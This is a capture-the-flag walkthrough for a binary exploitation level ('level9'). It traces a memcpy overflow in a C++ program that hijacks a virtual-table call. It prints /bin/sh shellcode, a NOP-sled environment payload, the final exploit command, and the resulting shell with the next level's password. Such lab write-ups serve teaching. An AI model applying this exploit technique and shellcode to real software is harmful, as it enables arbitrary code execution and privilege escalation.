# 🚀 Level 9 - Walkthrough
## 🧪 First Step - Testing the Program
```bash
$ ./level9
$ ./level9 coucou
$ ./level9 coucou coucou
```
- 🤔 No output regardless of the input.
- 🧩 Possibly vulnerable to buffer overflow or expecting crafted input.

## 🐞 Run in GDB
```bash
$ gdb -q ./level9
(gdb) disas main
```
- 🔍 The binary is C++ and calls operator new(unsigned int).
- 🧠 Objects are instantiated and methods invoked dynamically.
- 🔎 At main+142, the program dereferences a pointer and calls a function via a virtual table:

```asm
mov eax, DWORD PTR [eax]
call edx
```
## 🔬 Memory Layout & Overflow
- 💥 There's a call to memcpy, hinting at a potential overflow.
- 🎯 A pattern-based input shows a crash and helps identify the overflow offset:

```bash
$ ./get_offset.py 62626262
# => offset = 108
```
# 🧠 Exploit Strategy
- 🔁 At offset 0: place a pointer to the shellcode (in env).
- 🪤 At offset 108: overwrite the function pointer with a pointer to the pointer at offset 0.
- 🐚 Use shellcode in the environment and find its address via:

```bash
$ env -i payload=$(python -c 'print "\x90"*1000+"<shellcode>"') gdb ./level9
(gdb) x/200s environ
```
- 🧬 Example shellcode (spawns /bin/sh):

```bash
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\
\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\
\xe8\xdc\xff\xff\xff/bin/sh
```
# 🎯 Final Exploit
🧷 Assume shellcode is at 0xbffffc63 and static pointer at 0x0804a00c:

```bash
$ env -i payload=$(python -c 'print "\x90"*1000+"<shellcode>"') \
    ./level9 $(python -c 'print "\x63\xfc\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"')
```
## 🧾 Final Output
```bash
$ whoami
bonus0
$ cat ~/level10/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
- 🎉 Done!
